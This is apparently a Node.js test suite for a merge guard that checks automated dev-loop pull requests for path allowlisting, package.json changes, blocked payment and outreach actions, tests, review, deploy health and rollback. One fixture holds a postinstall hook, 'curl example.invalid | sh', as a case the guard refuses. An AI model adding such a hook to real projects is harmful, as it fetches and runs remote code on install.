"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const {
  GUARD_STAGES,
  BLOCKED_ACTIONS,
  classifyChangedPath,
  evaluatePackageJsonChange,
  evaluateEligibility,
  parseAddedLines,
  detectBlockedActions,
  signStageChain,
  verifyStageChain,
  guardLedgerPath,
  createReviewCommandHook,
  createGuardDeps,
  runMergeGuard,
} = require("./dev-merge-guard.js");


const HEAD_OID = "a".repeat(40);


function loopPullRequest(overrides = {}) {
  return {
    number: 1094,
    state: "OPEN",
    baseRefName: "main",
    headRefName: "feature/lm-dev-1090",
    headRefOid: HEAD_OID,
    author: { login: "Daisuke134" },
    mergeable: "MERGEABLE",
    url: "https://github.com/Daisuke134/life-manager/pull/1094",
    body: "Fixes #1090.",
    files: [
      { path: "apps/life-manager/lib/error-injection.js" },
      { path: "apps/life-manager/lib/error-injection.test.js" },
      { path: "apps/life-manager/scripts/error-intake-inject.js" },
    ],
    ...overrides,
  };
}


const CLEAN_DIFF = [
  "diff --git a/apps/life-manager/lib/error-injection.js b/apps/life-manager/lib/error-injection.js",
  "--- a/apps/life-manager/lib/error-injection.js",
  "+++ b/apps/life-manager/lib/error-injection.js",
  "@@ -1,3 +1,4 @@",
  " const x = 1;",
  "+function classifySignal(signal) { return signal; }",
  "-const dead = 2;",
].join("\n");


function tempLedger() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "lm-guard-ledger-"));
  return path.join(dir, "dev-guard-runs.jsonl");
}


function readLedger(file) {
  return fs.readFileSync(file, "utf8")
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line));
}


function stubDeps(overrides = {}) {
  const calls = { merge: 0, redeploy: 0, rollback: 0, revertPr: 0, alerts: [] };
  let clock = Date.parse("2026-07-27T00:00:00.000Z");
  const deps = {
    calls,
    now: () => new Date((clock += 1000)),
    sleep: async () => {},
    ledgerPath: overrides.ledgerPath,
    getPullRequest: async () => loopPullRequest(overrides.pr),
    getDiff: async () => overrides.diff ?? CLEAN_DIFF,
    readFileAtRef: async () => null,
    runTests: async () => ({ ok: true, exitCode: 0, output: "npm test ok\nnpm run eval ok" }),
    review: async () => ({ verdict: "pass", findings: [] }),
    merge: async () => {
      calls.merge += 1;
      return { ok: true, mergeSha: "b".repeat(40) };
    },
    getPreviousSuccessfulDeployment: async () => ({
      id: "dep-prev",
      status: "SUCCESS",
      canRollback: true,
      commitHash: "c".repeat(40),
    }),
    listDeployments: async () => [
      { id: "dep-new", status: "SUCCESS", meta: { commitHash: "b".repeat(40) } },
      { id: "dep-prev", status: "SUCCESS", meta: { commitHash: "c".repeat(40) } },
    ],
    triggerRedeploy: async () => {
      calls.redeploy += 1;
      return { ok: true };
    },
    checkHealth: async () => true,
    rollback: async () => {
      calls.rollback += 1;
      return { ok: true };
    },
    openRevertPr: async () => {
      calls.revertPr += 1;
      return { url: "https://github.com/Daisuke134/life-manager/pull/9999" };
    },
    alert: async (message) => { calls.alerts.push(message); },
  };
  return Object.assign(deps, overrides.deps || {});
}


test("guard stages run in the documented order", () => {
  assert.deepEqual(GUARD_STAGES, [
    "eligibility",
    "tests",
    "review",
    "blocked_actions",
    "merge",
    "deploy_health",
  ]);
});


test("path allowlist admits the three loop-owned directories", () => {
  for (const file of [
    "apps/life-manager/lib/error-injection.js",
    "apps/life-manager/lib/transport/mail-gog.js",
    "apps/life-manager/test/inngest.test.js",
    "apps/life-manager/scripts/error-intake-inject.js",
  ]) {
    assert.equal(classifyChangedPath(file).allowed, true, file);
  }
});


test("path allowlist refuses workflows, migrations, env files, the spec and skills", () => {
  const cases = [
    [".github/workflows/deploy.yml", "deny:workflow"],
    [".github/actions/thing/action.yml", "deny:workflow"],
    ["apps/life-manager/lib/migrations/003-add-column.sql", "deny:migration"],
    ["apps/life-manager/scripts/migration/backfill.js", "deny:migration"],
    ["apps/life-manager/.env.example", "deny:env"],
    ["apps/life-manager/lib/.env.production", "deny:env"],
    ["docs/superpowers/specs/2026-07-19-anicca-one-repo-consolidation-spec.md", "deny:spec"],
    ["skills/earn/marketing-engine/run_agent.sh", "deny:skill"],
    ["apps/life-manager/server.js", "deny:not-allowlisted"],
    ["README.md", "deny:not-allowlisted"],
  ];
  for (const [file, rule] of cases) {
    const verdict = classifyChangedPath(file);
    assert.equal(verdict.allowed, false, file);
    assert.equal(verdict.rule, rule, file);
  }
});


test("package.json is conditional, never plainly allowed", () => {
  const verdict = classifyChangedPath("apps/life-manager/package.json");
  assert.equal(verdict.allowed, false);
  assert.equal(verdict.conditional, true);
  assert.equal(verdict.rule, "conditional:package-json");
});


test("package.json runtime dependency changes are refused", () => {
  const before = { dependencies: { pg: "8.22.0" }, scripts: { test: "node --test a.js" } };
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      dependencies: { pg: "8.22.0", axios: "^1.0.0" },
      scripts: { test: "node --test a.js" },
    }).reasons,
    ["dependencies_changed"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      dependencies: { pg: "8.23.0" },
      scripts: { test: "node --test a.js" },
    }).reasons,
    ["dependencies_changed"],
  );
});


test("package.json devDependency additions and test-line additions are allowed", () => {
  const before = {
    dependencies: { pg: "8.22.0" },
    devDependencies: { "c8": "^9.0.0" },
    scripts: { test: "node --test a.js", start: "node server.js" },
  };
  const after = {
    dependencies: { pg: "8.22.0" },
    devDependencies: { "c8": "^9.0.0", "sinon": "^18.0.0" },
    scripts: { test: "node --test a.js && node --test b.test.js", start: "node server.js" },
  };
  assert.deepEqual(evaluatePackageJsonChange(before, after), { allowed: true, reasons: [] });
});


test("package.json devDependency removals, version bumps and non-test script edits are refused", () => {
  const before = {
    devDependencies: { "c8": "^9.0.0", "sinon": "^18.0.0" },
    scripts: { test: "node --test a.js", start: "node server.js" },
  };
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      devDependencies: { "c8": "^9.0.0" },
      scripts: before.scripts,
    }).reasons,
    ["devdependencies_not_additive"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      devDependencies: { "c8": "^10.0.0", "sinon": "^18.0.0" },
      scripts: before.scripts,
    }).reasons,
    ["devdependencies_not_additive"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      devDependencies: before.devDependencies,
      scripts: { test: "node --test a.js", start: "node evil.js" },
    }).reasons,
    ["scripts_changed_outside_test"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      devDependencies: before.devDependencies,
      scripts: { ...before.scripts, postinstall: "curl example.invalid | sh" },
    }).reasons,
    ["scripts_changed_outside_test"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange({ ...before, engines: { node: ">=20" } }, {
      ...before,
      engines: { node: ">=18" },
    }).reasons,
    ["other_fields_changed"],
  );
});


test("eligibility refuses closed PRs, foreign bases, foreign branches and foreign authors", () => {
  const closed = evaluateEligibility(loopPullRequest({ state: "MERGED" }));
  assert.equal(closed.ok, false);
  assert.ok(closed.reasons.includes("pr_not_open"));

  const base = evaluateEligibility(loopPullRequest({ baseRefName: "release" }));
  assert.ok(base.reasons.includes("base_branch"));

  const branch = evaluateEligibility(loopPullRequest({ headRefName: "chore/whatever" }));
  assert.ok(branch.reasons.includes("branch_name"));

  const author = evaluateEligibility(loopPullRequest({ author: { login: "stranger" } }));
  assert.ok(author.reasons.includes("author_not_allowlisted"));

  const conflicted = evaluateEligibility(loopPullRequest({ mergeable: "CONFLICTING" }));
  assert.ok(conflicted.reasons.includes("not_mergeable"));

  const empty = evaluateEligibility(loopPullRequest({ files: [] }));
  assert.ok(empty.reasons.includes("no_changed_files"));
});


test("eligibility accepts both fix/ and the dev loop's feature/lm-dev- branch names", () => {
  assert.equal(evaluateEligibility(loopPullRequest()).ok, true);
  assert.equal(evaluateEligibility(loopPullRequest({ headRefName: "fix/1090-timeout" })).ok, true);
});


test("eligibility reports the exact offending path and marks package.json conditional", () => {
  const workflow = evaluateEligibility(loopPullRequest({
    files: [
      { path: "apps/life-manager/lib/error-injection.js" },
      { path: ".github/workflows/deploy.yml" },
    ],
  }));
  assert.equal(workflow.ok, false);
  assert.ok(workflow.reasons.includes("path_allowlist"));
  assert.deepEqual(workflow.deniedPaths, [
    { path: ".github/workflows/deploy.yml", rule: "deny:workflow" },
  ]);

  const manifest = evaluateEligibility(loopPullRequest({
    files: [
      { path: "apps/life-manager/lib/error-injection.js" },
      { path: "apps/life-manager/package.json" },
    ],
  }));
  assert.deepEqual(manifest.conditionalPaths, ["apps/life-manager/package.json"]);
  assert.equal(manifest.ok, true);
});


test("added lines are attributed to their file and exclude removals and headers", () => {
  const added = parseAddedLines(CLEAN_DIFF);
  assert.deepEqual(added, [{
    path: "apps/life-manager/lib/error-injection.js",
    line: "function classifySignal(signal) { return signal; }",
  }]);
});


test("blocked actions cover outreach, payment and wallet transfer with a rationale each", () => {
  assert.deepEqual(
    BLOCKED_ACTIONS.map((entry) => entry.action).sort(),
    ["outreach_send", "payment", "wallet_transfer"],
  );
  for (const entry of BLOCKED_ACTIONS) {
    assert.equal(typeof entry.rationale, "string");
    assert.ok(entry.rationale.length > 20, entry.action);
  }
});


test("blocked actions are detected on added lines only", () => {
  assert.deepEqual(detectBlockedActions(parseAddedLines(CLEAN_DIFF)), []);

  const hits = detectBlockedActions([
    { path: "apps/life-manager/lib/x.js", line: "await sendOutreach(target);" },
    { path: "apps/life-manager/lib/y.js", line: "stripe.paymentIntents.create({ amount });" },
    { path: "apps/life-manager/lib/z.js", line: "const tx = await wallet.transfer(to, amount);" },
    { path: "apps/life-manager/lib/ok.js", line: "// documentation about payment flows" },
  ]);
  assert.deepEqual(hits.map((hit) => hit.action), ["outreach_send", "payment", "wallet_transfer"]);
  assert.equal(hits[0].path, "apps/life-manager/lib/x.js");
  assert.ok(hits[0].rationale.length > 20);
});


test("the guard's own blocklist definition lines are exempt so the loop can update the guard", () => {
  const source = fs.readFileSync(path.join(__dirname, "dev-merge-guard.js"), "utf8");
  const ownAdditions = source
    .split("\n")
    .filter((line) => /^\s*pattern:\s*\//.test(line))
    .map((line) => ({ path: "apps/life-manager/lib/dev-merge-guard.js", line }));
  assert.ok(ownAdditions.length >= 3);
  assert.deepEqual(detectBlockedActions(ownAdditions), []);
  assert.deepEqual(
    detectBlockedActions([{
      path: "apps/life-manager/lib/dev-merge-guard.js",
      line: "  await sendOutreach(target);",
    }]).map((hit) => hit.action),
    ["outreach_send"],
  );
});


test("stage records form a verifiable signature chain", () => {
  const stages = signStageChain("run-1", [
    { stage: "eligibility", ok: true, reason: null, evidence: { paths: 3 } },
    { stage: "tests", ok: true, reason: null, evidence: { exitCode: 0 } },
  ]);
  assert.equal(stages.length, 2);
  for (const record of stages) assert.match(record.signature, /^[a-f0-9]{64}$/);
  assert.equal(stages[1].prev, stages[0].signature);
  assert.equal(verifyStageChain("run-1", stages), true);

  const tampered = stages.map((record) => ({ ...record }));
  tampered[0].ok = false;
  assert.equal(verifyStageChain("run-1", tampered), false);
});


test("the ledger path honours LM_DEV_GUARD_LEDGER and otherwise lands in the state dir", () => {
  assert.equal(guardLedgerPath({ LM_DEV_GUARD_LEDGER: "/tmp/x.jsonl" }), "/tmp/x.jsonl");
  assert.equal(
    guardLedgerPath({ HOME: "/Users/fixture" }),
    "/Users/fixture/.life-manager/state/dev-guard-runs.jsonl",
  );
});


test("a passing run merges, redeploys, proves health and a fresh deployment id", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({ ledgerPath });
  const result = await runMergeGuard({ prNumber: 1094, deps });

  assert.equal(result.verdict, "merged_deployed");
  assert.equal(result.stoppedAtStage, null);
  assert.equal(deps.calls.merge, 1);
  assert.equal(deps.calls.redeploy, 1);
  assert.equal(deps.calls.rollback, 0);
  assert.equal(result.mergeSha, "b".repeat(40));
  assert.equal(result.deployId, "dep-new");
  assert.equal(result.health, "ok");
  assert.deepEqual(result.stagesPassed, GUARD_STAGES);

  const [row] = readLedger(ledgerPath);
  assert.deepEqual(Object.keys(row).sort(), [
    "deploy_id",
    "duration_ms",
    "finished_at",
    "health",
    "merge_sha",
    "pr",
    "rollback",
    "run_id",
    "schema_version",
    "stages",
    "stages_failed",
    "stages_passed",
    "started_at",
    "stop_reason",
    "stopped_at_stage",
    "verdict",
  ]);
  assert.equal(row.schema_version, 1);
  assert.equal(row.pr, 1094);
  assert.equal(row.verdict, "merged_deployed");
  assert.deepEqual(row.stages_passed, GUARD_STAGES);
  assert.deepEqual(row.stages_failed, []);
  assert.equal(row.merge_sha, "b".repeat(40));
  assert.equal(row.deploy_id, "dep-new");
  assert.equal(row.health, "ok");
  assert.equal(row.rollback, null);
  assert.ok(Number.isInteger(row.duration_ms) && row.duration_ms >= 0);
  assert.equal(verifyStageChain(row.run_id, row.stages), true);
  assert.equal(row.stop_reason, null);
  for (const stage of row.stages) assert.equal(stage.reason, null, stage.stage);
});


test("an ineligible PR stops before merge with an honest verdict", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    pr: { files: [{ path: ".github/workflows/deploy.yml" }] },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });

  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "eligibility");
  assert.ok(result.stopReason.includes("path_allowlist"));
  assert.equal(deps.calls.merge, 0);
  assert.equal(deps.calls.redeploy, 0);
  assert.equal(result.mergeSha, null);

  const [row] = readLedger(ledgerPath);
  assert.deepEqual(row.stages_passed, []);
  assert.deepEqual(row.stages_failed, ["eligibility"]);
  assert.equal(row.health, "skipped");
});


test("a conditional package.json change is resolved against both refs before merge", async () => {
  const ledgerPath = tempLedger();
  const before = JSON.stringify({ dependencies: { pg: "8.22.0" }, scripts: { test: "node --test a.js" } });
  const after = JSON.stringify({ dependencies: { pg: "8.22.0", axios: "^1" }, scripts: { test: "node --test a.js" } });
  const deps = stubDeps({
    ledgerPath,
    pr: { files: [{ path: "apps/life-manager/package.json" }] },
    deps: {
      readFileAtRef: async ({ ref }) => (ref === "main" ? before : after),
    },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "eligibility");
  assert.ok(result.stopReason.includes("package_json:dependencies_changed"));
  assert.equal(deps.calls.merge, 0);
});


test("a red test suite stops before merge", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: { runTests: async () => ({ ok: false, exitCode: 1, output: "1 failing" }) },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "tests");
  assert.equal(deps.calls.merge, 0);
  const [row] = readLedger(ledgerPath);
  assert.deepEqual(row.stages_failed, ["tests"]);
  assert.deepEqual(row.stages_passed, ["eligibility"]);
});


test("a FAIL adversary verdict stops before merge and keeps the findings", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: {
      review: async () => ({ verdict: "fail", findings: ["drops the retry budget"] }),
    },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "review");
  assert.equal(deps.calls.merge, 0);
  const [row] = readLedger(ledgerPath);
  const review = row.stages.find((entry) => entry.stage === "review");
  assert.deepEqual(review.evidence.findings, ["drops the retry budget"]);
});


test("an unusable adversary answer is a FAIL, not a pass", async () => {
  for (const answer of [null, {}, { verdict: "maybe" }, { verdict: "PASS" }]) {
    const deps = stubDeps({ ledgerPath: tempLedger(), deps: { review: async () => answer } });
    const result = await runMergeGuard({ prNumber: 1094, deps });
    assert.equal(result.stoppedAtStage, "review", JSON.stringify(answer));
    assert.equal(deps.calls.merge, 0);
  }
});


test("a blocked action in the diff stops before merge", async () => {
  const ledgerPath = tempLedger();
  const diff = [
    "diff --git a/apps/life-manager/lib/x.js b/apps/life-manager/lib/x.js",
    "+++ b/apps/life-manager/lib/x.js",
    "+  await wallet.transfer(to, amount);",
  ].join("\n");
  const deps = stubDeps({ ledgerPath, diff });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "blocked_actions");
  assert.equal(deps.calls.merge, 0);
  const [row] = readLedger(ledgerPath);
  const stage = row.stages.find((entry) => entry.stage === "blocked_actions");
  assert.deepEqual(stage.evidence.hits.map((hit) => hit.action), ["wallet_transfer"]);
});


test("a failed merge stops without touching deploy", async () => {
  const deps = stubDeps({
    ledgerPath: tempLedger(),
    deps: { merge: async () => ({ ok: false, reason: "merge_conflict" }) },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "merge");
  assert.equal(deps.calls.redeploy, 0);
});


test("health that never comes back rolls the previous deployment back", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: { checkHealth: async () => false },
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 3000, healthIntervalMs: 1000 },
  });

  assert.equal(result.verdict, "rolled_back");
  assert.equal(result.stoppedAtStage, "deploy_health");
  assert.equal(result.health, "failed");
  assert.equal(deps.calls.rollback, 1);
  assert.equal(deps.calls.revertPr, 0);
  assert.equal(deps.calls.alerts.length, 1);

  const [row] = readLedger(ledgerPath);
  assert.equal(row.merge_sha, "b".repeat(40));
  assert.equal(row.rollback.method, "railway_api_deployment_rollback");
  assert.equal(row.rollback.target_deployment_id, "dep-prev");
  assert.equal(row.rollback.ok, true);
  assert.ok(row.stages.some((entry) => entry.stage === "rollback"));
});


test("when the previous deployment cannot be rolled back the guard opens a revert PR and alerts", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: {
      checkHealth: async () => false,
      getPreviousSuccessfulDeployment: async () => ({
        id: "dep-prev",
        status: "SUCCESS",
        canRollback: false,
        commitHash: "c".repeat(40),
      }),
    },
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 2000, healthIntervalMs: 1000 },
  });

  assert.equal(result.verdict, "rolled_back");
  assert.equal(deps.calls.rollback, 0);
  assert.equal(deps.calls.revertPr, 1);
  const [row] = readLedger(ledgerPath);
  assert.equal(row.rollback.method, "revert_pr");
  assert.equal(row.rollback.revert_pr_url, "https://github.com/Daisuke134/life-manager/pull/9999");
  assert.ok(deps.calls.alerts.some((message) => message.includes("revert")));
});


test("a healthy deploy that never produces a new deployment id is not called fresh", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: {
      listDeployments: async () => [
        { id: "dep-prev", status: "SUCCESS", meta: { commitHash: "c".repeat(40) } },
      ],
    },
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 2000, healthIntervalMs: 1000, freshTimeoutMs: 2000 },
  });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "deploy_health");
  assert.equal(result.stopReason, "deploy_freshness_unverified");
  assert.equal(result.health, "ok");
  assert.equal(deps.calls.rollback, 0);
  assert.ok(deps.calls.alerts.length >= 1);
});


test("the review command hook pipes the diff and reads a JSON verdict", async () => {
  const seen = {};
  const hook = createReviewCommandHook("my-reviewer --json", {
    exec: (file, args, options) => {
      seen.file = file;
      seen.args = args;
      seen.input = options.input;
      return JSON.stringify({ verdict: "pass", findings: [] });
    },
  });
  assert.deepEqual(await hook("THE DIFF", { prNumber: 7 }), { verdict: "pass", findings: [] });
  assert.equal(seen.file, "/bin/sh");
  assert.deepEqual(seen.args, ["-c", "my-reviewer --json"]);
  assert.equal(seen.input, "THE DIFF");
});


test("a review command that does not answer in JSON is a FAIL", async () => {
  const hook = createReviewCommandHook("noisy", { exec: () => "not json at all" });
  const verdict = await hook("d", {});
  assert.equal(verdict.verdict, "fail");
  assert.ok(verdict.findings.length > 0);
});


test("createGuardDeps rolls back through the railway GraphQL API, which is the only supported path", async () => {
  const commands = [];
  const deps = createGuardDeps({
    gh: (args) => {
      commands.push(["gh", ...args]);
      return "{}";
    },
    exec: (file, args) => {
      commands.push([file, ...args]);
      if (file === "railway" && args[0] === "api") {
        return JSON.stringify({ data: { deploymentRollback: true } });
      }
      return "{}";
    },
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
  });

  const rollback = await deps.rollback({ deploymentId: "dep-prev" });
  assert.equal(rollback.ok, true);
  const call = commands.find((entry) => entry[0] === "railway" && entry[1] === "api");
  assert.ok(call, "rollback must go through `railway api`");
  assert.match(call[2], /deploymentRollback/);
  assert.equal(call[3], "--variables");
  assert.deepEqual(JSON.parse(call[4]), { id: "dep-prev" });
});


test("createGuardDeps never asks `railway redeploy` to target a deployment id", async () => {
  const commands = [];
  const deps = createGuardDeps({
    gh: () => "{}",
    exec: (file, args) => {
      commands.push([file, ...args]);
      return "{}";
    },
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
  });
  await deps.triggerRedeploy();
  const call = commands.find((entry) => entry[0] === "railway" && entry[1] === "redeploy");
  assert.ok(call);
  assert.ok(call.includes("--yes"));
  assert.equal(call.some((argument) => /^dep-/.test(String(argument))), false);
});


test("createGuardDeps waits out GitHub's lazily computed UNKNOWN mergeability", async () => {
  const answers = [
    JSON.stringify(loopPullRequest({ mergeable: "UNKNOWN" })),
    JSON.stringify(loopPullRequest({ mergeable: "UNKNOWN" })),
    JSON.stringify(loopPullRequest({ mergeable: "MERGEABLE" })),
  ];
  let slept = 0;
  const deps = createGuardDeps({
    gh: () => answers.shift(),
    exec: () => "{}",
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
    sleep: async () => { slept += 1; },
  });
  const pr = await deps.getPullRequest(1094);
  assert.equal(pr.mergeable, "MERGEABLE");
  assert.equal(slept, 2);
});


test("createGuardDeps gives up on UNKNOWN mergeability instead of inventing an answer", async () => {
  const deps = createGuardDeps({
    gh: () => JSON.stringify(loopPullRequest({ mergeable: "UNKNOWN" })),
    exec: () => "{}",
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
    sleep: async () => {},
  });
  const pr = await deps.getPullRequest(1094);
  assert.equal(pr.mergeable, "UNKNOWN");
  assert.equal(evaluateEligibility(pr).ok, false);
});


test("createGuardDeps runs the full suite and the evals in a throwaway worktree", async () => {
  const commands = [];
  const deps = createGuardDeps({
    gh: () => "{}",
    exec: (file, args) => {
      commands.push(`${file} ${args.join(" ")}`);
      return "";
    },
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
  });
  const result = await deps.runTests({ headOid: HEAD_OID, headRefName: "feature/lm-dev-1090" });
  assert.equal(result.ok, true);
  assert.ok(commands.some((entry) => /^git worktree add/.test(entry)));
  assert.ok(commands.some((entry) => /^npm ci/.test(entry)));
  assert.ok(commands.some((entry) => entry === "npm test"));
  assert.ok(commands.some((entry) => entry === "npm run eval"));
  assert.ok(commands.some((entry) => /^git worktree remove/.test(entry)));
});
